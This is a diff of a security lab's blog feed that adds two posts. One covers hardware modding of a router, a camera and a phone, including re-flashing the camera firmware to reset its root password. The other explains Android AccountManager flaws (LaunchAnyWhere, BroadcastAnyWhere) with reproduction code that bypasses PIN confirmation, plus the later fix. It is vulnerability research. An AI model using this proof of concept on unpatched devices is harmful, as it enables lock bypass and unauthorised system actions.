@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.future-sec.com/"/>
-  <updated>2018-06-29T09:01:06.020Z</updated>
+  <updated>2018-06-29T09:45:30.762Z</updated>
   <id>http://www.future-sec.com/</id>
   
   <author>
@@ -16,9 +16,187 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>物联网安全硬件修改系列-硬改</title>
+    <link href="http://www.future-sec.com/iot-security-hardware-modification.html"/>
+    <id>http://www.future-sec.com/iot-security-hardware-modification.html</id>
+    <published>2018-06-26T16:00:00.000Z</published>
+    <updated>2018-06-29T09:45:30.762Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>硬件层面的修改在现实生活中是相当常见的事情，所谓的硬改、魔改、硬破等等说法，指的就是在硬件层面对设备进行diy功能改造。例如针对传统路由器的硬件架构，替换大容量的内存和闪存芯片，使之能够刷openwrt系统；对某些设备进行配置层的升级，如iPhone，小米等手机内存扩容，使之具有更大容量的存储空间和运行内存； 以及对设备的破解，例如ps,xbox等游戏主机系列的硬破、软破，还有对各种加密录音笔，摄像头，加密U盘和硬盘的破解。<br>研究硬件修改对硬件diy改造，以及厂商在硬件层的安全防护具有非常重要意义。硬件层修改分为硬改和软改两个部分，硬改是对硬件中芯片和电路的改造、替换等，软改是针对芯片固件的修改、重打包等。本节将用具体的几个实例展示如何对设备进行硬改。</p>
+<h2 id="硬改路由器刷openwrt"><a href="#硬改路由器刷openwrt" class="headerlink" title="硬改路由器刷openwrt"></a>硬改路由器刷openwrt</h2><h3 id="修改方案"><a href="#修改方案" class="headerlink" title="修改方案"></a>修改方案</h3><p>目前市面上主流的路由器，平时家用功能或许够用，但如果需要一些高级功能，比如屏蔽广告，挂vpn等等又难以实现，而采用openwrt系统可以充分满足定制化和diy的需求，openwrt是一个高度模块化、高度自动化的嵌入式Linux系统，拥有强大的网络组件和扩展性，但如果专门购买openwrt系统的路由器，价格却又不是十分亲民，如果能把传统路由器通过硬件修改，刷入openwrt系统，就是个低成本的解决方案了，本次用来硬改的路由器具体参数如下：品牌：TP-Link， 型号：WR842N，版本：v4.3，采用高通QCA9533的主控，16M的闪存、2M的flash芯片，虽然是老机器，但除了不能外接usb，基本满足需求，当然价格也便宜。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_150638.jpg" alt=""></p>
+<p>不得不说TP-Link最近出的机器，硬件缩水越来越严重，新的机器，闪存都集成到了CPU里面，基本没有硬改的空间了。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180613_174407.jpg" alt=""></p>
+<h3 id="更换内存芯片"><a href="#更换内存芯片" class="headerlink" title="更换内存芯片"></a>更换内存芯片</h3><p>openwrt系统最低硬件配置需要32M内存+8M存储芯片，因此需要更换机器上对应的两块芯片，下图红框部分。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_15063822.jpg" alt=""></p>
+<p>首先更换内存芯片，换上64M内存芯片，新手的话，建议通过风枪来拆芯片，先用胶带保护一下芯片周围的元件，防止吹飞掉，加点助焊膏，温度稍微高一点。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_160529.jpg" alt=""></p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_152140.jpg" alt=""></p>
+<p>芯片拆下后，先清洁一下焊盘，用吸锡线去掉焊盘上残余的锡，使焊盘平整，便于对齐芯片引脚。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_152132.jpg" alt=""></p>
+<p>清洁完成后，换上64M芯片，注意芯片上的小圆点就是第一脚，需要跟焊盘上的右下角的小圆点对齐，方向不对，芯片就白焊了。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_154431.jpg" alt=""></p>
+<p>对齐芯片后，先上一点锡，把芯片固定住，然后涂上助焊剂，为了防止引脚锡粘连，建议助焊膏多放一点，然后采用堆锡法，烙铁头采用弯头，便于拖动焊锡，温度稍高一点，一般无铅锡丝温度在380左右，否则焊锡拖不动，注意锡要适量，否则处理起来比较麻烦，用烙铁头的弯曲处沿着引脚朝一个方向拖动，可能会有剩余的锡处理不掉，可以用吸锡线处理。焊好一侧后，继续用同样的方式焊另一侧，全部焊接完成之后，让芯片自然冷却后，用洗板水或无水酒精清洗干净。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_153819.jpg" alt=""></p>
+<p>先通电测试下路由器工作是否正常，如果亮灯不正常，就需要补焊一次。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_153823.jpg" alt=""></p>
+<p>确认路由器工作正常，接下来拆下flash芯片，同样用风枪，拆下后，处理一下焊盘。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_160657.jpg" alt=""></p>
+<h3 id="刷编程器固件"><a href="#刷编程器固件" class="headerlink" title="刷编程器固件"></a>刷编程器固件</h3><p>在恩山上下载了LEDE17.1的编程器固件，支持WR842N型号路由器，明月固件也可以，然后把bin文件通过编程器刷进芯片中。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_161309.jpg" alt=""></p>
+<p>芯片放置在烧录座中，用烧录座连接编程器。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_154759.jpg" alt=""></p>
+<p>编程器刷入固件。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606164128.png" alt=""></p>
+<h3 id="更换闪存芯片"><a href="#更换闪存芯片" class="headerlink" title="更换闪存芯片"></a>更换闪存芯片</h3><p>把烧录完成后的芯片取出，然后焊接上，同样注意引脚的方向，芯片上的小圆点为第一脚，对准焊盘上的第一脚，加点助焊膏。<br>存储芯片引脚间距较大，用烙铁头粘上一点锡，采用点焊法即可焊上。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_171616.jpg" alt=""></p>
+<h3 id="硬改完成"><a href="#硬改完成" class="headerlink" title="硬改完成"></a>硬改完成</h3><p>全部焊接完成，把板子清洁一下，重新通电测试，路由器正常，搜索到wifi信号后连接，后台地址：<a href="http://192.168.1.1/" rel="external nofollow noopener noreferrer" target="_blank">http://192.168.1.1/</a> 默认用户名和密码；root、root，登录进去，一切正常，说明硬改成功。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180613191402.jpg" alt=""></p>
+<p>openwrt刷好后，需要先修改密码，然后开启一下ssh，就可以用ssh登录管理了，网上很多编译好的安装包，根据自己的需要安装。</p>
+<h2 id="体外分离硬破摄像头"><a href="#体外分离硬破摄像头" class="headerlink" title="体外分离硬破摄像头"></a>体外分离硬破摄像头</h2><h3 id="修改方案-1"><a href="#修改方案-1" class="headerlink" title="修改方案"></a>修改方案</h3><p>在对某品牌智能摄像头进行串口调试时，发现厂商对串口进行了加密，需要输入root密码才能登陆系统。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180614141635.jpg" alt=""></p>
+<p>尝试读取固件中的shadow文件，随即拆掉芯片进行固件读取，飞线读写的成功率不高。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180529_161328.jpg" alt=""></p>
+<p>成功提取固件，找到密码，却暴力破解不了，可行的方案是修改密码然后重新打包固件在刷进芯片中了，改完密码后，重打包在刷进去。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180529_161037.jpg" alt=""></p>
+<p>然而事情并不简单。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/sdfsdfsf5656.jpg" alt=""></p>
+<p>固件修改重刷之后，通电测试发现摄像头并不能启动，排查问题根源在于固件重打包过程出了问题，内部可能也有校验，反复多次试验后，出现了意料之中的事情，因为摄像头较为廉价，PCB做工用料并不是十分优秀，反复拆焊导致焊盘损坏，芯片焊上去出现短路、断路等等问题，绝缘层脱落，采用飞线也无法解决，机器彻底报废，最终出现了如下尸横遍野的结果。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180614_115142.jpg" alt=""></p>
+<h3 id="拆存储芯片"><a href="#拆存储芯片" class="headerlink" title="拆存储芯片"></a>拆存储芯片</h3><p>固件修改重刷是难以一次修改成功的，报废过多，造成太多的浪费，最终想到采用全部焊点飞线到烧录座上，在把芯片放在烧录座上，只要保证焊接不出错，飞线距离够短，就能保证焊盘不受损坏，固件也可以反复烧录测试。<br>首先拆掉芯片，周围同样采用胶带保护一下。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180529_161733.jpg" alt=""></p>
+<h3 id="飞线芯片烧录座"><a href="#飞线芯片烧录座" class="headerlink" title="飞线芯片烧录座"></a>飞线芯片烧录座</h3><p>飞线采用很细的漆包铜线，线长控制在10厘米以内，刮去漆包线头的绝缘层，然后依次飞线焊接，注意焊盘和烧录座引脚的顺序。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180604_161048.jpg" alt=""></p>
+<p>飞线完成后，用热熔胶固定好焊盘和飞线，防止焊点脱落。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180604_162135.jpg" alt=""></p>
+<p>通电测试，发现机器一切正常，说明改造成功。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180604_163009.jpg" alt=""></p>
+<h3 id="烧录固件"><a href="#烧录固件" class="headerlink" title="烧录固件"></a>烧录固件</h3><p>继续修改固件测试，修改的细节在之后固件修改章节会详细说明，<br>因为芯片放在烧录座上，可以轻易的取下重刷，极大的提高了效率，最终成功修改好密码，固件刷录，机器开启正常。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180614133847.jpg" alt=""></p>
+<h3 id="硬破成功"><a href="#硬破成功" class="headerlink" title="硬破成功"></a>硬破成功</h3><p>用修改之后的密码成功登陆进行串口调试，继续更深层次的安全检测，此处调试接口RX、TX焊点已引出，方便接线。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/5b3265e34f0a9.jpg" alt=""></p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/5b3263dc9f57a.jpg" alt=""></p>
+<h2 id="魔改小米5手机加6G内存"><a href="#魔改小米5手机加6G内存" class="headerlink" title="魔改小米5手机加6G内存"></a>魔改小米5手机加6G内存</h2><h3 id="修改方案-2"><a href="#修改方案-2" class="headerlink" title="修改方案"></a>修改方案</h3><p>小米手机一向以性价比著称，但其中的小米5作为2016年的旗舰机，却受到颇多的诟病，核心在于采用的是高通骁龙820的CPU，高配版的内存RAM都只有3G，导致手机运行中不是很流畅，鉴于内存过低，因此准备魔改成6G内存，本次更换的芯片为三星K3RG6G60MM-MGCJ-LPDDR4-6G内存芯片。</p>
+<h3 id="拆机"><a href="#拆机" class="headerlink" title="拆机"></a>拆机</h3><p>说干就干，小米5的话，还是很好拆的一种机型，后盖可以直接打开，然后把螺丝、排线、电池一一取下，主板拿出来即可，注意电池因为背面贴有双面胶，一定不要用蛮力，否则可能损坏底部的排线和屏幕。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_193306.jpg" alt=""></p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_193313.jpg" alt=""></p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_193540.jpg" alt=""></p>
+<p>主板取下后，没有被屏蔽罩保护的就是内存芯片，揭开散热垫，小米5自带的内存芯片型号为:海力士skhynix-H9HKNNNDGUMU-BRNMH-3Gbit-LPD4。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_193901.jpg" alt=""></p>
+<h3 id="拆内存芯片"><a href="#拆内存芯片" class="headerlink" title="拆内存芯片"></a>拆内存芯片</h3><p>拆内存芯片要注意保护好周围元器件，贴上高温铝箔纸，涂上焊膏，风枪先给板子预热几秒，然后在距离芯片1厘米左右位置，沿着芯片四周按照同一个方向转动，使芯片均匀受热，防止爆板和爆片。<br>)<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_141602.jpg" alt=""></p>
+<p>取下芯片后，清洁焊盘。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_143142.jpg" alt=""></p>
+<h3 id="植锡球"><a href="#植锡球" class="headerlink" title="植锡球"></a>植锡球</h3><p>BGA焊接，植锡球是关键，植锡之前，必须把植锡网清洁干净，选用合适的锡球和BGA专用焊膏，先把芯片涂上一层焊膏，涂抹要均匀，注意不要过多，以植锡网覆盖上去后，焊膏不能溢出植锡网孔为准，否则会粘连锡球，选用0.25的无铅低温锡球，把芯片在植锡台上放好，然后盖上植锡网，要对准芯片的焊点，然后盖上固定盖。倒进锡球，稍微晃动一下，使锡球均匀的分布在网孔里，然后倒掉多余锡球，取下植锡网，在用热风枪加热植好锡球的芯片，使锡球固定，注意要缓慢移动风枪，风嘴距离芯片要稍远一点，防止锡球吹飞。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_144833.jpg" alt=""></p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_145204.jpg" alt=""></p>
+<h3 id="BGA焊接"><a href="#BGA焊接" class="headerlink" title="BGA焊接"></a>BGA焊接</h3><p>先给焊盘均匀的上好一层焊膏，植好锡球的芯片，对准主焊盘，然后放置到BGA返修台上固定好，先100度预热烘干，在执行BGA焊接曲线。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_151437.jpg" alt=""></p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_151701.jpg" alt=""></p>
+<p>焊接完成后，使板子自然冷却，然后清洗干净。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_154349.jpg" alt=""></p>
+<h3 id="魔改完成"><a href="#魔改完成" class="headerlink" title="魔改完成"></a>魔改完成</h3><p>装机，然后开机测试，一切正常，说明魔改成功。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/5b3263dc9f57e.jpg" alt=""></p>
+<h2 id="《物联网安全百科》"><a href="#《物联网安全百科》" class="headerlink" title="《物联网安全百科》"></a>《物联网安全百科》</h2><p>伏宸安全实验室发起的开源图书《物联网安全百科》已经初步上线了，书中记录了实验室最新的一些研究成果和方向，以及物联网安全研究从基础到进阶的一些经验和知识，希望对有志于物联网安全研究者能起到一点的帮助，开源图书项目也希望能够得到大家的支持，一起参与去丰富内容，使之更加完善。<br><a href="https://iot-security.org" rel="external nofollow noopener noreferrer" target="_blank">图书阅读:</a> <a href="https://iot-security.org" rel="external nofollow noopener noreferrer" target="_blank">https://iot-security.org</a><br><a href="https://github.com/yaseng/iot-security-wiki" rel="external nofollow noopener noreferrer" target="_blank">项目地址:</a> <a href="https://github.com/yaseng/iot-security-wiki" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/yaseng/iot-security-wiki</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;硬件层面的修改在现实生活中是相当常见的事情，所谓的硬改、魔改、硬破等等说法，指的就是在硬件层面对设备进行diy功能改造。例如针对传统路由器的
+    
+    </summary>
+    
+      <category term="硬改" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E6%94%B9/"/>
+    
+    
+      <category term="硬件分析" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%88%86%E6%9E%90/"/>
+    
+      <category term="硬改" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E6%94%B9/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Android账户机制漏洞专题</title>
+    <link href="http://www.future-sec.com/android-account-manager-vulnerabilitys.html"/>
+    <id>http://www.future-sec.com/android-account-manager-vulnerabilitys.html</id>
+    <published>2018-06-24T16:00:00.000Z</published>
+    <updated>2018-06-29T10:16:12.555Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Android 2.0中加入了一个新的包android.accounts，该包主要包括了集中式的账户管理API，用以安全地存储和访问认证的令牌和密码，比如，我们的手机存在多个账户，每个账户下面都有不同的信息，甚至每个账户都可以与不同的服务器之间进行数据同步（例如，手机账户中的联系人可以是一个Gmail账户中的通讯录，可联网进行同步更新）。通俗地讲，就是Android系统会开一个异步进程去帮我们登录（验证）账号，就不需要我们每次点开APP的时候还要走一遍登录（验证）账号的流程。我们根据这个机制，找到了三个可以利用的漏洞。</p>
+<h2 id="账户机制介绍"><a href="#账户机制介绍" class="headerlink" title="账户机制介绍"></a>账户机制介绍</h2><p>我们先看一下账户机所运用到的API：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/20180629175412.jpg" alt=""></p>
+<h3 id="创建账户："><a href="#创建账户：" class="headerlink" title="创建账户："></a>创建账户：</h3><p>首先是class Authenticator extends AbstractAccountAuthenticator ,如下图，该类是账号验证类 ，其中addAccount方法用来定义需要增加账号时的操作，如调用AuthenticatorActivity来进行账号的添加认证：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/1.jpg" alt=""></p>
+<h3 id="同步账户："><a href="#同步账户：" class="headerlink" title="同步账户："></a>同步账户：</h3><p>SyncAdapter继承自AbstractThreadedSyncAdapter，SyncAdapter同样需要一个服务（Service）和一个同步适配器(AbstractThreadedSyncAdapter)。SyncAdapter的Service 需要在AndroidManifest里面声明一个带有Intent：android.content.SyncAdapter的Service来达到向系统注册一个具有同步功能的账户适配器(sync-adapter)。同步的方法主要在:<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/2.jpg" alt=""></p>
+<p>在开发代码中用accountManager调用了addAccount方法后，就可以在android系统的 设置—&gt;账户 里面可以看到我们创建的账户:<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/3.png" alt=""></p>
+<p>接下来点击Account账户中，可以找到立即同步的按钮，点击的话可以执行“立即同步”，就相当于执行了onPerformSync方法:<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/4.png" alt=""></p>
+<p>下图为安卓系统添加账户的整体流程图：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/5.png" alt=""></p>
+<h2 id="漏洞利用及复现"><a href="#漏洞利用及复现" class="headerlink" title="漏洞利用及复现"></a>漏洞利用及复现</h2><h3 id="Launch-Anywhere"><a href="#Launch-Anywhere" class="headerlink" title="Launch Anywhere"></a>Launch Anywhere</h3><p>AccountManagerService是系统服务之一，暴露给开发者的的接口是AccountManager。普通应用（记为AppA）去请求添加某类账户时，会调用AccountManager.addAccount,然后AccountManager会去查找提供账号的应用（记为AppB）的Authenticator类，调用Authenticator. addAccount方法；AppA再根据AppB返回的Intent去调起AppB的账户登录界面。这个过程如图所示：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/6.png" alt=""></p>
+<h4 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><p>这种设计的本意是，AccountManagerService帮助AppA查找到AppB账号登陆页面，并呼起这个登陆页面。而问题在于，AppB可以任意指定这个intent所指向的组件，AppA将在不知情的情况下由AccountManagerResponse调用起了一个Activity. 如果AppA是一个system权限应用，比如Settings，那么AppA能够调用起任意AppB指定的未导出Activity。</p>
+<p>主要可以利用的代码：<br><figure class="highlight scala"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/** Handles the responses from the AccountManager */</span></div><div class="line"><span class="type">Private</span> <span class="class"><span class="keyword">class</span> <span class="title">Response</span> <span class="keyword">extends</span> <span class="title">IAccountManagerResponse</span>.<span class="title">Stub</span> </span>&#123;</div><div class="line">true<span class="type">Public</span> void onResult (<span class="type">Bundle</span> bundle) &#123;</div><div class="line">truetrue<span class="type">Intent</span> intent = bundle.getParcelable(<span class="type">KEY_INTENT</span>);</div><div class="line">truetrue<span class="type">If</span> (intent != <span class="literal">null</span> &amp;&amp; mActivity != <span class="literal">null</span>) &#123;</div><div class="line">truetrue  <span class="comment">// since the user provided an Activity we will silently start intents</span></div><div class="line">truetrue  <span class="comment">// that we see</span></div><div class="line">truetrue  mActivity.startActivity(intent);</div><div class="line">truetruetrue<span class="comment">// leave the Future running to wait for the real response to this request</span></div><div class="line">truetruetrue&#125; <span class="keyword">else</span> <span class="keyword">if</span> (bundle.getBoolean (<span class="string">"retry"</span>)) &#123;</div><div class="line">          ...</div></pre></td></tr></table></figure></p>
+<h4 id="复现代码："><a href="#复现代码：" class="headerlink" title="复现代码："></a>复现代码：</h4><p>继承了AbstractAccountAuthenticator的类：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">@Override</div><div class="line">public <span class="keyword">Bundle </span><span class="keyword">addAccount(AccountAuthenticatorResponse </span>response,</div><div class="line">                         String accountType, String authTokenType,</div><div class="line">                         String[] requiredFeatures, <span class="keyword">Bundle </span>options)</div><div class="line">        throws NetworkErrorException &#123;</div><div class="line">    Intent intent = new Intent()<span class="comment">;</span></div><div class="line">    intent.setComponent(new ComponentName(</div><div class="line">            <span class="string">"com.android.settings"</span>,</div><div class="line">            <span class="string">"com.android.settings.ChooseLockPassword"</span>))<span class="comment">;</span></div><div class="line">    intent.setAction(Intent.ACTION_RUN)<span class="comment">;</span></div><div class="line">    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)<span class="comment">;</span></div><div class="line">    intent.putExtra(<span class="string">"confirm_credentials"</span>,false)<span class="comment">;</span></div><div class="line">    final <span class="keyword">Bundle </span><span class="keyword">bundle </span>= new <span class="keyword">Bundle();</span></div><div class="line">    <span class="keyword">bundle.putParcelable(AccountManager.KEY_INTENT, </span>intent)<span class="comment">;</span></div><div class="line">    return <span class="keyword">bundle;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>在继承了AbstractAccountAuthenticator的类中，我们重写了addAccount方法，配置一个可以打开修改pin码的系统级别的intent，然后再return 带有这个intent的bundle，系统得到这个bundle之后就会去启动这个intent，进而打开重置pin码的页面。</p>
+<p>MainAcitivity类：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Intent intent1 = new Intent()<span class="comment">;</span></div><div class="line">intent1.setComponent(new ComponentName(</div><div class="line">        <span class="string">"com.android.settings"</span>,</div><div class="line">        <span class="string">"com.android.settings.accounts.AddAccountSettings"</span>))<span class="comment">;</span></div><div class="line">intent1.setAction(Intent.ACTION_RUN)<span class="comment">;</span></div><div class="line">intent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)<span class="comment">;</span></div><div class="line">String authTypes[] = &#123;TYPE &#125;<span class="comment">;</span></div><div class="line">intent1.putExtra(<span class="string">"account_types"</span>, authTypes)<span class="comment">;</span></div><div class="line">intent1.putExtra(<span class="string">"authTypes"</span>, authTypes)<span class="comment">;</span></div><div class="line">this.startActivity(intent1)<span class="comment">;</span></div></pre></td></tr></table></figure></p>
+<p>这里我们只是在主类中启动了账户页面，并且进入创建账户的页面，从而触发AbstractAccountAuthenticator类中我们重写的addAccount方法，进入重置pin码的界面。</p>
+<h4 id="复现截图："><a href="#复现截图：" class="headerlink" title="复现截图："></a>复现截图：</h4><ol>
+<li><p>我们先设置初始pin码为123456，锁屏后需要输入123456来解锁手机。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/7.png" alt=""></p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/8.png" alt=""></p>
+</li>
+</ol>
+<p>然后进入手机后，打开我们的APP，就能绕过pin码验证直接跳转到重置pin码界面。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/9.png" alt=""></p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/10.png" alt=""></p>
+<ol>
+<li>我们也可以通过调用一些特殊应用的的用户资料界面，这种界面的exported属性一般是false，protectlevel属性signature，在这里也是可以直接导出，直接获取到其的个人敏感信息。（这里就不写相应的代码）<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/11.png" alt=""><h4 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h4>安卓4.4已经修复了这个漏洞，检查了Step3中返回的intent所指向的Activity和AppB是否是有相同签名的。避免了launch Anywhere的可能。修复代码如下：<figure class="highlight cos"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">If</span> (PackageManager.SIGNATURE_MATCH !=</div><div class="line">                        pm.checkSignatures(authenticatorUid, targetUid)) &#123;</div><div class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> SecurityException(</div><div class="line">                            <span class="string">"Activity to be started with KEY_INTENT must "</span> +</div><div class="line">                            <span class="string">"share Authenticator's signatures"</span>)<span class="comment">;</span></div><div class="line">                &#125;</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/12.png" alt=""></p>
+<h3 id="Broadcast-Anyway"><a href="#Broadcast-Anyway" class="headerlink" title="Broadcast Anyway"></a>Broadcast Anyway</h3><p>继上面Android的LaunchAnyWhere组件安全漏洞后，最近Google在Android 5.0的源码上又修复了一个高危漏洞，该漏洞简直是LaunchAnyWhere的姊妹版——BroadcastAnyWhere。通过这个漏洞，攻击者可以以system用户的身份发送广播，这意味着攻击者可以无视一切的BroadcastReceiver组件访问限制。而且该漏洞影响范围极广，Android 2.0+至4.4.x都受影响。</p>
+<h4 id="漏洞原理：-1"><a href="#漏洞原理：-1" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><p>BroadcastAnyWhere跟LaunchAnyWhere的利用原理非常类似，两者都利用了Setting的uid是system进程高权限操作。漏洞同样发生在Setting的添加账户的addAccount方法上。根据之前的addAccount方法中我们看到有个参数是Bundle类型的，参数名为options，该参数内部附带有添加用户用的额外信息，我们用代码展示一下内部的信息：</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/13.png" alt=""></p>
+<p>可以看到，该额外参数告诉我们，执行添加账户的用户id是1000，也就是系统用户，有root权限，还有个参数是pendingIntent，该参数是主要是作为身份识别用的，也是具有系统权限的，我们攻击的切入点就是pendingIntent。</p>
+<h4 id="pendingIntent介绍："><a href="#pendingIntent介绍：" class="headerlink" title="pendingIntent介绍："></a>pendingIntent介绍：</h4><p>PendingIntent对象可以按预先指定的动作进行触发，当这个对象传递（通过binder）到其他进程（不同uid的用户）,其他进程利用这个PendingIntent对象，可以原进程的身份权限执行指定的触发动作，这有点类似于Linux上suid或guid的效果。另外，由于触发的动作是由系统进程执行的，因此哪怕原进程已经不存在了，PendingIntent对象上的触发动作依然有效。</p>
+<h4 id="攻击思路："><a href="#攻击思路：" class="headerlink" title="攻击思路："></a>攻击思路：</h4><p>PendingIntent提供了一个方法为send (Context context, int code, Intent intent, PendingIntent.OnFinished onFinished, Handler handler, String requiredPermission, Bundle options)，里面可以传一个参数为Intent intent，而在5.0的版本之前，我们可以对intent进行任意构造，然后通过pendingIntent发送出去。攻击思路如图：</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/14.png" alt=""></p>
